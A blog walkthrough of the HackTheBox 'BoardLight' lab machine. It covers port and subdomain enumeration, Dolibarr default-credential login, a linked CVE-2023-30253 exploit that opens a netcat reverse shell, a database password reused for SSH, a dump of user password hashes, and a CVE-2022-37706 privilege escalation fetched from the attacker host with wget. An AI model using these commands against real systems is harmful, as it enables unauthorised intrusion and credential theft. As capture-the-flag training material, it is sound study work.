---
layout: page
title: BoardLight
description: BoardLight from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/boardlight/logo.png" title="HTB BoardLight Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/BoardLight">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Blinded by the light!  Here we go!

Run nmap and get a list of the ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.11
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 12:52 AEDT
Nmap scan report for 10.10.11.11
Host is up (0.015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   17.72 ms 10.10.16.1
2   17.77 ms 10.10.11.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
```
{% endraw %}

<br />
Run nmap against all the ports to find any non-standard services.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.11.11               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 12:52 AEDT
Nmap scan report for 10.10.11.11
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
```
{% endraw %}

<br />
Run curl to see if there is any interesting information in the headers.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ curl -I http://10.10.11.11                               
HTTP/1.1 200 OK
Date: Sat, 01 Feb 2025 01:53:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```
{% endraw %}

<br />
Check the landing page that is being served on port 80.  Notice the domain at the bottom of the page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/boardlight/landing.png" title="Port 80 Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check out the source page for the page.  Might be hidden gems burried in there.

{% raw %}
```html
view-source:http://10.10.11.11/

<!DOCTYPE html>
<html>

<head>
  <!-- Basic -->
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <!-- Mobile Metas -->
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <!-- Site Metas -->
  <meta name="keywords" content="" />
  <meta name="description" content="" />
  <meta name="author" content="" />

<snip>

  <script type="text/javascript">
    $(".owl-carousel").owlCarousel({
      loop: true,
      margin: 0,
      navText: [],
      center: true,
      autoplay: true,
      autoplayHoverPause: true,
      responsive: {
        0: {
          items: 1
        },
        1000: {
          items: 3
        }
      }
    });
  </script>
  <!-- end owl carousel script -->

</body>

</html>
```
{% endraw %}

<br />
Update the /etc/hosts with the domain from the bottom of the page.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ cat /etc/hosts   
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.11     board.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}

<br />
Ffuf to see if there are any subdomains.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -fw 6243

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6243
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 49ms]
:: Progress: [114441/114441] :: Job [1/1] :: 407 req/sec :: Duration: [0:04:35] :: Errors: 0 ::
```
{% endraw %}

<br />
Re-update the /etc/hosts file to include the new subdomain.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.11     board.htb crm.board.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}

<br />
Check the landing page of the new crm subdomain.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/boardlight/crmlanding.png" title="CRM Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Ffuf for directories and files.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://board.htb/FUZZ -e .txt,.bak,.pdf -fw 6243

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .pdf 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6243
________________________________________________

images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 25ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 12ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 28ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 33ms]
:: Progress: [882236/882236] :: Job [1/1] :: 2631 req/sec :: Duration: [0:09:02] :: Errors: 0 ::
```
{% endraw %}

<br />
Look up dolibarr looking for any default credentials.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/boardlight/creds.png" title="Default Creds" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.dolibarr.org/forum/t/login-after-installation/16088/3">https://www.dolibarr.org/forum/t/login-after-installation/16088/3</a>

<br />
Test the credentials to see if we can actually login.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/boardlight/testcreds.png" title="Test the Creds" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Research the technology and its version looking for any vulnerabilities or exploits.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/boardlight/github.png" title="Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a>

<br />
Download the exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ wget https://raw.githubusercontent.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/refs/heads/main/exploit.py
--2025-02-01 13:41:45--  https://raw.githubusercontent.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/refs/heads/main/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 2606:50c0:8001::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16280 (16K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]  15.90K  --.-KB/s    in 0.003s  

2025-02-01 13:41:46 (6.02 MB/s) - ‘exploit.py’ saved [16280/16280]
```
{% endraw %}

<br />
Start a listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ sudo nc -nlvp 443                                        
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Run the exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ python3 exploit.py http://crm.board.htb admin admin 10.10.16.12 443
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ sudo nc -nlvp 443                                        
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.11.11] 46936
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
```
{% endraw %}

<br />
Take a look at the conf.php file for the dolibarr app.

{% raw %}
```sh
www-data@boardlight:~/html/crm.board.htb$ cat htdocs/conf/conf.php
cat htdocs/conf/conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

<snip>
```
{% endraw %}

<br />
Review /etc/passwd to get the user of the system.

{% raw %}
```sh
www-data@boardlight:~/html/crm.board.htb$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

<snip>

sssd:x:126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:127:134:MySQL Server,,,:/nonexistent:/bin/false
fwupd-refresh:x:128:135:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:129:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
{% endraw %}

<br />
Use the larissag name from the passwd file and the database password from the conf.php file to ssh into the system.

{% raw %}
```sh
larissa:serverfun2$2023!!

┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ ssh larissa@10.10.11.11
The authenticity of host '10.10.11.11 (10.10.11.11)' can't be established.
ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.11' (ED25519) to the list of known hosts.
larissa@10.10.11.11's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
larissa@boardlight:~$ cat user.txt 
<redacted>
larissa@boardlight:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:d2:f7 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.11/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:d2f7/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:feb9:d2f7/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Login to the database with the credentials from the conf.php.

{% raw %}
```sh
larissa@boardlight:/var/www/html$ mysql -u dolibarrowner -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
{% endraw %}

<br />
Check the databases and change to the dolibarr database.

{% raw %}
```sh
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| dolibarr           |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use dolibarr;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
{% endraw %}

<br />
Show all the tables and look for the llx_user table.

{% raw %}
```sh
mysql> show tables;
+-------------------------------------------------------------+
| Tables_in_dolibarr                                          |
+-------------------------------------------------------------+

<snip>

| llx_user                                                    |
| llx_user_alert                                              |
| llx_user_clicktodial                                        |
| llx_user_employment                                         |
| llx_user_extrafields                                        |
| llx_user_param                                              |
| llx_user_rib                                                |
| llx_user_rights                                             |
| llx_usergroup                                               |
| llx_usergroup_extrafields                                   |
| llx_usergroup_rights                                        |
| llx_usergroup_user                                          |
| llx_website                                                 |
| llx_website_extrafields                                     |
| llx_website_page                                            |
+-------------------------------------------------------------+
307 rows in set (0.00 sec)
```
{% endraw %}

<br />
Swipe the details for the users from the table.

{% raw %}
```sh
mysql> select entity, admin, login, pass_encoding, pass, pass_crypted from llx_user;
+--------+-------+----------+---------------+------+--------------------------------------------------------------+
| entity | admin | login    | pass_encoding | pass | pass_crypted                                                 |
+--------+-------+----------+---------------+------+--------------------------------------------------------------+
|      0 |     1 | dolibarr | NULL          | NULL | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
|      1 |     0 | admin    | NULL          | NULL | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
+--------+-------+----------+---------------+------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```
{% endraw %}

<br />
Create a passes.txt that contains the encrypted strings.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ cat passes.txt
$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm
```
{% endraw %}

<br />
Set john the ripper or hashcat against them.  While it runs, download linpeas.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/linpeas.sh                              
--2025-02-01 13:49:07--  https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/linpeas.sh
Resolving github.com (github.com)... 140.82.114.3
Connecting to github.com (github.com)|140.82.114.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/98d382c4-9811-4ab6-8add-8117ade69f94?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250201%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250201T024911Z&X-Amz-Expires=300&X-Amz-Signature=eeff7fdf211a11b601fc7b6904d84648bd21e3979c78aa76cd59a00207865f37&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-02-01 13:49:08--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/98d382c4-9811-4ab6-8add-8117ade69f94?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250201%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250201T024911Z&X-Amz-Expires=300&X-Amz-Signature=eeff7fdf211a11b601fc7b6904d84648bd21e3979c78aa76cd59a00207865f37&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839766 (820K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 820.08K  3.13MB/s    in 0.3s    

2025-02-01 13:49:09 (3.13 MB/s) - ‘linpeas.sh’ saved [839766/839766]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ python3 -m http.server                                             
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer the peas to the victim machine.  Run the linpeas.sh script.

{% raw %}
```sh
larissa@boardlight:/dev/shm$ ./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀

<snip>

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                                                                                                                                                   
-rwsr-sr-x 1 root root 15K Apr  8  2024 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 467K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 84K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 67K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper

<snip>
```
{% endraw %}

<br />
Research the enlightenment file that is indicated in the SUID section.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/boardlight/enlight.png" title="Enlightenment" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit</a>

<br />
Download the new exploit that we found.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh
--2025-02-14 23:00:16--  https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 2606:50c0:8003::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 709 [text/plain]
Saving to: ‘exploit.sh’

exploit.sh                                                 100%[========================================================================================================================================>]     709  --.-KB/s    in 0s      

2025-02-14 23:00:16 (41.9 MB/s) - ‘exploit.sh’ saved [709/709]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/boardlight]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer the exploit to the victim machine.

{% raw %}
```sh
larissa@boardlight:~$ wget 10.10.16.12:8000/exploit.sh
--2025-02-14 04:01:05--  http://10.10.16.12:8000/exploit.sh
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 709 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                                                 100%[========================================================================================================================================>]     709  --.-KB/s    in 0s      

2025-02-14 04:01:05 (47.7 MB/s) - ‘exploit.sh’ saved [709/709]

larissa@boardlight:~$ chmod +x exploit.sh
```
{% endraw %}

<br />
Run the exploit.

{% raw %}
```sh
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
# cat /root/root.txt
<redacted>
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:27:4f brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.11/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:274f/64 scope global dynamic mngtmpaddr 
       valid_lft 86392sec preferred_lft 14392sec
    inet6 fe80::250:56ff:feb9:274f/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Wrapped up another one.  Hope you enjoyed.  See you in the next.